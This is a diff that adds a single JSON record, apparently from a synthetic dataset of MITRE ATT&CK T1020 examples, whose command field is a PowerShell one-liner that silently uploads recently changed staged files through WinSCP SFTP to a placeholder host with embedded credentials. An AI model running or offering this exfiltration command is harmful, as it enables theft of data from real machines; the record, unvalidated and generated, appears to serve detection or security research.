@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$r=\"/staging/\"; & 'C:\\Program Files (x86)\\WinSCP\\WinSCP.com' /ini=nul /command 'option batch abort' 'option confirm off' 'open sftp://exfil:S3cr3t!@203.0.113.30/ -hostkey=\"ssh-ed25519 255 SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\"' (\"put -resume C:\\Windows\\Temp\\stage\\* `\"$r`\" -filemask=>=1H\") 'exit' | Out-Null 2>$null",
+  "explanation": "Transfers only files modified within the last hour from a staging directory using WinSCP filemask time filter for automated incremental exfiltration.",
+  "rationale_steps": [
+    "Target recently changed files to minimize volume",
+    "Open non-interactive SFTP session with host key pinning",
+    "Upload with time-based filemask and resume",
+    "Suppress output for stealth"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-1f3f2541-4fe0d1b7",
+  "source_prompt_hash": "1f3f2541",
+  "timestamp_utc": "2025-09-30T09:07:17.472275Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
